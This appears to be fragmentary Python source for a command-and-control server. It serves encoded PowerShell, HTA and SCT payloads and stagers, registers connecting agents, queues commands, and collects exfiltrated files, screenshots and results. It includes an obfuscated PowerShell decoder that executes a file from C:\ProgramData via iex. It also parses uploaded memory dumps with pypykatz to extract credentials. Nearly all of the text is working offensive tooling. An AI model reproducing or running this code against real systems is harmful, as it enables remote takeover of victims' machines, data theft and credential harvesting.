...
urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc', b64_stager, 'stager', b52_stager, 'stager52',
...
def stager52():
    ...
    if SSL == True:
        stager = stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace(
            '{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "https")
    else:
        stager = stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace(
            '{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "http")
    return stager
...
def base64():
    ip = request.remote_addr
    p_out = '\n[+] BASE64 Powershell PAYLOAD Send (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def payloadc():
    ip = request.remote_addr
    p_out = '\n[+] Powershell Encoded PAYLOAD Send (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def payloadjf():
    ip = request.remote_addr
    p_out = '\n[+] Powershell JOB + File PAYLOAD Send (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
    ...
    if SSL == True:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace(
            '{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}',
                                                                                    b52_payload).replace('{hjf}',
                                                                                                         hjf_payload).replace(
            '{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload).replace('{HTTP}',
                                                                                                        "https")
    else:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace(
            '{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}',
    ...
    payload = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s')))}" % payload.decode(
        "UTF-8")
    return payload
...
def payloadjfs():
    #print("in")
    ip = request.remote_addr
    p_out = '\n[+] Powershell JOB + File +SCT PAYLOAD Send (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
    ...
    commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
    payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace(
        '{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace(
        '{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}',
                                                                                                    hta_payload)
    commandF = base64mod.b64encode(bytearray(commandF, "UTF-8"))
    payload = payload.replace('{payload}', commandF.decode("UTF-8"))
    payload = base64mod.b64encode(bytearray(payload, "UTF-8"))
...
def info():
    ...
    if AGENTS.get(id) is None and data is not None:
        data = data.split('**')
        ip = request.remote_addr
        data.insert(0, ip)
        data.insert(0, COUNT)
        # set_count(COUNT + 1)
        COUNT = COUNT + 1
        p_out = '\n[+] New Agent Connected(%d): %s - %s\\%s' % (COUNT - 1,
                                                              ip,
                                                              data[6],
                                                              data[7])
        print(bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def upload():
    try:
        ...
        if AGENTS.get(id) is not None and name is not None:
            name = decrypt(AESKey, name.strip().replace(" ", "+"))
            if len(name.split("\\")) > 0:
                name = name.replace("\"", "").split("\\")[-1]
            fp = open(f'{campaign_name}/file/' + name.replace('\00', ''), 'rb')
            file = fp.read()
...
def mshta():
    ip = request.remote_addr
    p_out = '\n[+] New Agent Request HTA PAYLOAD (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
    ...
    js = js.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}',
                                                                                                b52_payload).replace(
        '{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}',
                                                                                                              hjfs_payload).replace(
        '{sct}', sct_payload).replace('{hta}', hta_payload)
    ...
    try:
        ...
        pass
    payload = open('utils/payloads/Webserver/mshta.js', 'w')
...
def sct(request):
    ip = request.remote_addr
    p_out = '\n[+] New Agent Request SCT PAYLOAD (%s)' % ip
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def download():
    ...
    # print(id)
    # print(data)
    if AGENTS.get(id) is not None and data is not None:
        ...
        fp = open(f'{campaign_name}/downloads/' + filename, 'wb')
        fp.write(filecontent)
        fp.close()
        p_out = '\n[+] Agent (%d) - %s send open(%s bytes)' % (AGENTS[id][0], AGENTS[id][7], len(data))
        print(bcolors.OKGREEN + p_out + bcolors.ENDC)
        return 'OK'
...
def image():
    ...
    if AGENTS.get(id) is not None and data is not None:
        ...
        fp = open(f'{campaign_name}/images/%s.png' % fn, 'wb')
        fp.write(data)
        fp.close()
        p_out = '\n[+] Agent (%d) - %s send image(%s bytes)' % (AGENTS[id][0], AGENTS[id][7], len(data))
        print(bcolors.OKGREEN + p_out + bcolors.ENDC)
    return 'OK'
...
def command():
    ...
    if AGENTS.get(id) is not None:
        TIME[id] = time.time()
    if AGENTS.get(id) is not None and len(COMMAND.get(id)) > 0:
        cmd = COMMAND[id].pop(0)
        out = bcolors.OKGREEN + '[~] ' + id + ':' + decrypt(AESKey, cmd) + bcolors.ENDC
        print(out)
        history = open("logs/c2-logs.txt", "a")
        ...
        return "".join([random.choice(string.ascii_uppercase) for i in range(rand1)]) + "-*-*-*" + "".join(
            [random.choice(string.ascii_uppercase) for i in range(rand2)])
...
def result():
    ...
    if AGENTS.get(id) != None and data != None:
        ...
        p_out = '\n[+] Agent (%d) - %s@%s\\%s send Result' % (AGENTS[id][0], AGENTS[id][7], AGENTS[id][6], AGENTS[id][5])
        history = open("logs/c2-logs.txt", "a")
        history.write(p_out + "\n")
        ...
        if data.decode("UTF-8").find("Defense_Ananylsis_Module") > -1:
            ...
            fname = f"{campaign_name}/DA/" + AGENTS[id][7] + "@" + AGENTS[id][6] + "DA_out.txt"
            da = open(fname, "w")
        ...
        if data.decode("UTF-8").find("Dump_start_from_here:") > -1:
            ...
            fname = f"{campaign_name}/downloads/" + AGENTS[id][7] + "@" + AGENTS[id][6] + "safetydump.dmp"
            k = open(fname, "w")
            k.write(data.decode("UTF-8").replace("\00", " ").split("Dump_start_from_here:")[1])
            k.close()

            fname = f"{campaign_name}/downloads/" + AGENTS[id][6] + "safetydump-decoded.dmp"
            k = open(fname, "wb")
            k.write(base64mod.b64decode(data.decode("UTF-8").replace("\00", " ").split("Dump_start_from_here:")[1]))
            k.close()
            mimi = pypykatz.parse_minidump_file(f"{campaign_name}/downloads/" + AGENTS[id][6] + "safetydump-decoded.dmp")
...
def modules():
    ...
    if AGENTS.get(id) is not None and data is not None:
        ...
        p_out = '\n[+] New Agent Request Module %s (%s - %s)' % (data, AGENTS[id][0], AGENTS[id][7])
        print(bcolors.OKGREEN + p_out + bcolors.ENDC)
        try:
